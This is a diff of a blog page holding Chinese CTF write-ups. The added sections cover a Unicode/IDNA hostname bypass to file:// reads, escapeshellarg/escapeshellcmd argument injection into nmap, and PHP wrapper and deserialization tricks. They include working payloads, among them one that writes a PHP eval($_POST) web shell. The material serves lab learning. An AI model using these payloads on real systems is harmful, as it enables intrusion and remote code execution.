@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2018-10-15</span>
-            <span class="time">06:29:36</span>
+            <span class="time">03:17:53</span>
           </span>
           
           <!--  Categories  -->
@@ -343,6 +343,103 @@ $phar-&gt;stopBuffering();
 <span class="hljs-meta">?&gt;</span></span></code></pre>
 
 <p>最后访问phar.phar/exp.txt就是flag</p>
+<h1 id="pythonginx"><a href="#pythonginx" class="headerlink" title="pythonginx"></a>pythonginx</h1><p>首先说一下2019黑帽大会的一个编码问题,其实之前有介绍 unicode编码欺骗,题目中给了</p>
+<pre><code class="hljs undefined">@app.route(<span class="hljs-string">'/getUrl'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>])
+def getUrl():
+    url = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">"url"</span>)
+    host = parse.urlparse(url).<span class="hljs-built_in">hostname</span>
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 111"</span>
+    parts = <span class="hljs-keyword">list</span>(urlsplit(url))
+    host = parts[<span class="hljs-number">1</span>]
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 222 "</span> + host
+    newhost = []
+    <span class="hljs-keyword">for</span> h in host.<span class="hljs-keyword">split</span>(<span class="hljs-string">'.'</span>):
+        newhost.<span class="hljs-keyword">append</span>(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))
+    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.<span class="hljs-keyword">join</span>(newhost)
+    #去掉 url 中的空格
+    finalUrl = urlunsplit(parts).<span class="hljs-keyword">split</span>(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
+    host = parse.urlparse(finalUrl).<span class="hljs-built_in">hostname</span>
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
+        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).<span class="hljs-keyword">read</span>()
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 333"</span></code></pre>
+
+<p>三个host都等于suctf.cc但我们要到最后一个判断就需要编码欺骗了,代码如下</p>
+<pre><code class="hljs undefined"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit
+<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_unicode</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">65536</span>):
+        uni=chr(x)
+        url=<span class="hljs-string">"http://suctf.c&#123;&#125;"</span>.format(uni)
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">if</span> getUrl(url):
+                print(<span class="hljs-string">"str: "</span>+uni+<span class="hljs-string">' unicode: \\u'</span>+str(hex(x))[<span class="hljs-number">2</span>:])
+        <span class="hljs-keyword">except</span>:
+            <span class="hljs-keyword">pass</span>
+ 
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span><span class="hljs-params">(url)</span>:</span>
+    url=url
+    host=parse.urlparse(url).hostname
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+    parts=list(urlsplit(url))
+    host=parts[<span class="hljs-number">1</span>]
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+    newhost=[]
+    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):
+        newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))
+    parts[<span class="hljs-number">1</span>]=<span class="hljs-string">'.'</span>.join(newhost)
+    finalUrl=urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
+    host=parse.urlparse(finalUrl).hostname
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+ 
+ 
+<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:
+    get_unicode()</code></pre>
+
+<p><img src="https://img-blog.csdnimg.cn/20200206184554866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="unicode"><br>下面就可以file读取<br><code>http://abf40225-aa82-4dde-8e22-2c31ad0a0f42.node3.buuoj.cn/getUrl?url=file://suctf.c%E2%84%82/../../../../..//usr/fffffflag</code></p>
+<h1 id="BUUCTF-2018-Online-Tool-escapeshellarg和escapeshellcmd"><a href="#BUUCTF-2018-Online-Tool-escapeshellarg和escapeshellcmd" class="headerlink" title="[BUUCTF 2018]Online Tool(escapeshellarg和escapeshellcmd)"></a>[BUUCTF 2018]Online Tool(escapeshellarg和escapeshellcmd)</h1><pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;
+    $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];
+&#125;
+
+<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'host'</span>])) &#123;
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125; <span class="hljs-keyword">else</span> &#123;
+    $host = $_GET[<span class="hljs-string">'host'</span>];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5(<span class="hljs-string">"glzjin"</span>. $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">'you are in sandbox '</span>.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);
+&#125;</span></code></pre>
+
+<p>php中在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。<br>对于单个单引号,<br>escapeshellarg 函数转义后,还会在左右各加一个单引号,但 escapeshellcmd 函数是直接加一个转义符，<br>对于成对的单引号, escapeshellcmd 函数默认不转义,但 escapeshellarg 函数转义:<br><img src="https://img-blog.csdnimg.cn/20200209192620837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>传入的参数是<br>127.0.0.1’ -v -d a=1<br>由于escapeshellarg先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：<br>‘127.0.0.1’&#39;‘ -v -d a=1’<br>经过escapeshellcmd针对第二步处理之后的参数中的\以及a=1’中的单引号进行处理转义之后的效果如下所示：<br>‘127.0.0.1’\‘’ -v -d a=1&#39;<br>由于第三步处理之后的payload中的\被解释成了\而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：<br>所以这个payload可以简化为curl 127.0.0.1\ -v -d a=1’，即向127.0.0.1\发起请求，POST 数据为a=1’。<br>但是如果是先用 escapeshellcmd 函数过滤,再用的 escapeshellarg 函数过滤,则没有这个问题。<br>如上题的payloads<br><code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code><br>注意前后都是有空格的,否则会出现多\<br>转义后<br><code>&#39;&#39;\\&#39;&#39; \&lt;\?php phpinfo\(\)\;\?\&gt; -oG hack.php &#39;\\&#39;&#39;&#39;</code><br>用菜刀连接</p>
+<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>假如传入参数<br><code>$text=$_get(&quot;text&quot;);file_get_content($text)</code><br>那么我们该怎么传入$text参数呢<br>我们可以通过data伪协议传入,如果我们传入<br>welcome to the zjctf,就要先base64加密<br>然后<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code><br>读取php协议可以php伪协议(这一点经常忘)</p>
+<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>  
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span>
+    <span class="hljs-keyword">public</span> $file;  
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span><span class="hljs-params">()</span></span>&#123;  
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  
+            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file); 
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
+        <span class="hljs-keyword">return</span> (<span class="hljs-string">"U R SO CLOSE !///COME ON PLZ"</span>);
+        &#125;  
+    &#125;  
+&#125;  
+<span class="hljs-meta">?&gt;</span></span></code></pre>
+
+<p>反序列化<br>$flag=new Flag();<br>$flag=serialize($flag);<br>echo $flag;<br>然后传参即可<br>注意一点当我们最终传参的时候php的参数不要再用伪协议因为已经读完了</p>
 
         </div>
       </div>
